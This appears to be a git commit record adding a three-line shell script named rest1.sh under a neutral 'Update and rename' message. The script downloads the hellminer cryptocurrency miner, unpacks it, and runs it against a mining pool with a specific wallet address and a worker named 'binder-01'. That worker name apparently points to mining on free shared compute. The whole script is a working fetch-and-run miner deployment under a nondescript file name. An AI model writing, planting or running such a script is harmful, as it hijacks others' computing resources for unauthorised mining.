ae82a2864cdd6a43c2a2396f1999724612faf6bd
peterwujin01 <147368389+peterwujin01@users.noreply.github.com>
2023-10-09 14:34:03 +0800

    Update and rename rest.sh to rest1.sh

---
+++ rest1.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+tar -xf hellminer_linux64.tar.gz
+./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHTc3sa8bhr6qXb9hsVE98JCMZUVp5JQMo.binder-01 -p x
